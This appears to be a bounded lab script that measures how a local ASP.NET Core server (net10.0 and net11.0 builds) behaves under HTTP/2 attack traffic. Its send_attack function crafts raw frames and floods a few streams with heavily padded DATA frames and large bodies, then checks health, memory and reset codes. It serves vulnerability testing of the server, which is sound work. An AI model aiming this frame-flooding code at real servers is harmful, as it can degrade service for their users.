import json
import os
import socket
import struct
import subprocess
import sys
import time

HOST, PORT = "127.0.0.1", 50743
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"

def frame(kind, flags, stream, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([kind, flags]) + stream.to_bytes(4, "big") + payload

def headers(path, method):
    p = path.encode("ascii")
    return bytes([0x82 if method == "GET" else 0x83, 0x86, 0x04, len(p)]) + p + b"\x01\x09localhost"

def open_h2():
    s = socket.create_connection((HOST, PORT), timeout=2)
    s.settimeout(2)
    s.sendall(PREFACE + SETTINGS)
    return s

def read_frames(s, seconds):
    deadline = time.monotonic() + seconds
    buf = bytearray()
    found = []
    while time.monotonic() < deadline:
        s.settimeout(min(0.2, max(0.01, deadline - time.monotonic())))
        try:
            chunk = s.recv(65536)
            if not chunk:
                found.append(("closed", 0, 0, b""))
                break
            buf.extend(chunk)
            while len(buf) >= 9:
                length = int.from_bytes(buf[:3], "big")
                if len(buf) < 9 + length:
                    break
                kind, flags = buf[3], buf[4]
                stream = int.from_bytes(buf[5:9], "big") & 0x7fffffff
                payload = bytes(buf[9:9 + length])
                del buf[:9 + length]
                found.append((kind, flags, stream, payload))
        except socket.timeout:
            continue
        except OSError as e:
            found.append(("socket_error", 0, 0, str(e).encode()))
            break
    return found

def health():
    s = open_h2()
    try:
        s.sendall(frame(1, 5, 1, headers("/health", "GET")))
        frames = read_frames(s, 1.5)
        payload = b"".join(f[3] for f in frames if f[0] == 0 and f[2] == 1)
        return json.loads(payload) if payload else None
    finally:
        s.close()

def health_samples(n=4):
    samples = []
    for _ in range(n):
        start = time.monotonic()
        try:
            obj = health()
            samples.append({"ms": round((time.monotonic() - start) * 1000, 2), "ok": bool(obj and obj.get("ok")), "stats": obj})
        except Exception as e:
            samples.append({"ms": round((time.monotonic() - start) * 1000, 2), "ok": False, "error": type(e).__name__ + ": " + str(e)})
        time.sleep(0.05)
    return samples

def send_attack(s, case, config):
    if config == "tight":
        streams = [1, 3]
        pad_each = 48 * 1024
        body_each = 48 * 1024
    else:
        streams = [1, 3, 5]
        pad_each = 256 * 1024
        body_each = 512 * 1024
    if case == "pad_pipe":
        streams = [1]
        pad_each = 256 * 1024
        body_each = 896 * 1024
    if case == "valid":
        streams = [1]
        pad_each = 0
        body_each = 16 * 1024
    for stream in streams:
        s.sendall(frame(1, 4, stream, headers("/hold", "POST")))
    sent_pad = sent_body = 0
    if case in ("prepad", "pad_only", "pad_pipe"):
        padded = frame(0, 8, 1, b"\xff" + b"\x00" * 255)
        for stream in streams:
            padded = frame(0, 8, stream, b"\xff" + b"\x00" * 255)
            count = pad_each // 256
            for i in range(0, count, 128):
                n = min(128, count - i)
                s.sendall(padded * n)
                sent_pad += 265 * n
    if case != "pad_only":
        for stream in streams:
            remaining = body_each
            while remaining:
                n = min(16384, remaining)
                s.sendall(frame(0, 0, stream, b"x" * n))
                sent_body += n + 9
                remaining -= n
    assert sent_pad + sent_body < 3_000_000
    return {"streams": len(streams), "padding_wire": sent_pad, "body_wire": sent_body, "body_data": len(streams) * body_each if case != "pad_only" else 0}

def one(assembly, version, config, case):
    env = os.environ.copy()
    env["ASPNETCORE_ENVIRONMENT"] = "Production"
    env["F043_TIGHT"] = "1" if config == "tight" else "0"
    proc = subprocess.Popen(["dotnet", assembly], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    attack = None
    try:
        for i in range(40):
            if proc.poll() is not None:
                raise RuntimeError("server exited: " + proc.stderr.read().decode(errors="replace")[:2000])
            try:
                baseline = health()
                if baseline and baseline.get("ok"):
                    break
            except Exception:
                time.sleep(0.1)
        else:
            raise RuntimeError("server failed to become healthy")
        before = health_samples(3)
        attack = open_h2()
        try:
            sent = send_attack(attack, case, config)
        except OSError as e:
            sent = {"send_error": type(e).__name__ + ": " + str(e)}
        time.sleep(0.25)
        during = health_samples(5)
        signals = read_frames(attack, 0.5)
        goaway = [int.from_bytes(f[3][4:8], "big") for f in signals if f[0] == 7 and len(f[3]) >= 8]
        resets = [int.from_bytes(f[3][:4], "big") for f in signals if f[0] == 3 and len(f[3]) >= 4]
        attack.close()
        attack = None
        time.sleep(0.2)
        after = health_samples(3)
        def summary(samples):
            good = [x for x in samples if x["ok"]]
            return {"success": len(good), "total": len(samples), "max_ms": max(x["ms"] for x in samples),
                    "working_set": good[-1]["stats"]["workingSet"] if good else None,
                    "managed": good[-1]["stats"]["managed"] if good else None,
                    "threads": good[-1]["stats"]["threads"] if good else None,
                    "started": good[-1]["stats"]["started"] if good else None}
        return {"version": version, "config": config, "case": case, "sent": sent,
                "before": summary(before), "during": summary(during), "after": summary(after),
                "goaway_error_codes": goaway, "reset_error_codes": resets,
                "frames_seen": len(signals), "server_alive": proc.poll() is None}
    except Exception as e:
        return {"version": version, "config": config, "case": case, "error": type(e).__name__ + ": " + str(e), "server_alive": proc.poll() is None}
    finally:
        if attack is not None:
            attack.close()
        proc.terminate()
        try:
            proc.communicate(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate(timeout=3)

def main():
    for version in ("net10.0", "net11.0"):
        assembly = os.path.abspath(os.path.join("f043-lab", "bin", "Debug", version, "f043-lab.dll"))
        for config in ("default", "tight"):
            for case in ("valid", "no_pad", "pad_only", "prepad"):
                print(json.dumps(one(assembly, version, config, case)), flush=True)
        print(json.dumps(one(assembly, version, "default", "pad_pipe")), flush=True)
    print("F043_BOUNDED_LAB_COMPLETE", flush=True)

if __name__ == "__main__":
    main()
